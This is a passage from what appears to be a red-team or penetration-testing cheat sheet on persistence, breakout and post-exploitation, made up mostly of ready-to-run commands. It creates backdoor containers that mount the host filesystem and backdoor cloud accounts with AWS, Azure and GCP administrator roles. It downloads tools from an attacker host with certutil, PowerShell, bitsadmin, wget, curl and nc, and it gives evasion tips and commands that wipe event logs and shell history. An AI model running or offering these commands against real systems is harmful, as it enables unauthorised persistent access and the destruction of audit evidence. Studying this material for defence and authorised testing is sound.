kubectl create deployment backdoor --image=alpine -- sh -c "while true; do sleep 10; done"

# Docker
docker run -d --restart=always --name=backdoor -v /:/host alpine sh -c "while true; do sleep 60; done"

# Advanced Persistence
# Rootkit installation (Linux)
insmod rootkit.ko

# Bootkit (Windows)
# Modify boot sector

# Firmware implants
# UEFI rootkit installation

# Cloud Persistence
# AWS
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor

# Azure
az ad user create --display-name backdoor --password <PASSWORD> --user-principal-name backdoor@<TENANT>.onmicrosoft.com
az role assignment create --assignee backdoor@<TENANT>.onmicrosoft.com --role "Global Administrator"

# GCP
gcloud iam service-accounts create backdoor
gcloud projects add-iam-policy-binding <PROJECT_ID> --member="serviceAccount:backdoor@<PROJECT_ID>.iam.gserviceaccount.com" --role="roles/owner"
```

**Pitfalls:**
- EDR detecting persistence
- Regular security scans
- System reinstalls
- Credential rotation
- Cloud security monitoring

**Cleanup Steps:**
```bash
# Remove Windows persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "<NAME>" /f
schtasks /delete /tn "<TASK_NAME>" /f
sc delete <SERVICE_NAME>

# Remove Linux persistence
crontab -r
systemctl disable backdoor.service
rm /etc/systemd/system/backdoor.service
```

**Suggested Findings:**
- Multiple persistence methods
- Boot-level persistence
- Cloud account backdoors
- Service-level implants

**Conditions When to Try:**
- Long-term access needed
- Post-breach actions required
- Red team operations
- APT simulation

---

## Final Notes

### Breakout Strategy
1. **Enumerate** - Understand environment constraints
2. **Evade** - Bypass/disable security controls
3. **Escalate** - Gain higher privileges
4. **Pivot** - Access restricted networks
5. **Persist** - Maintain long-term access

### Key Considerations
- **OpSec** - Avoid detection, use encryption
- **Stability** - Don't crash critical systems
- **Cleanup** - Remove artifacts when done
- **Documentation** - Track all actions taken
- **Legal** - Stay within authorized scope

### Common Tool Downloads
```bash
# Windows
certutil.exe -urlcache -f http://<IP>/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe','file.exe')"
bitsadmin /transfer job http://<IP>/file.exe C:\temp\file.exe

# Linux
wget http://<IP>/file
curl -o file http://<IP>/file
nc -l -p 9999 > file  # On target
nc <TARGET_IP> 9999 < file  # On attacker
```

### Living Off the Land Binaries (LOLBins)
```bash
# Windows LOLBins reference
# https://lolbas-project.github.io/

# Linux GTFOBins reference
# https://gtfobins.github.io/
```

### Detection Evasion Tips
- Use legitimate processes for injection
- Obfuscate payloads and commands
- Avoid common exploit signatures
- Use encrypted channels
- Blend with normal traffic
- Clean logs when possible

### Emergency Cleanup
```bash
# Windows - Clear event logs
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
Clear-EventLog -LogName * -ErrorAction SilentlyContinue

# Linux - Clear logs
> /var/log/auth.log
> /var/log/syslog
> ~/.bash_history
history -c
```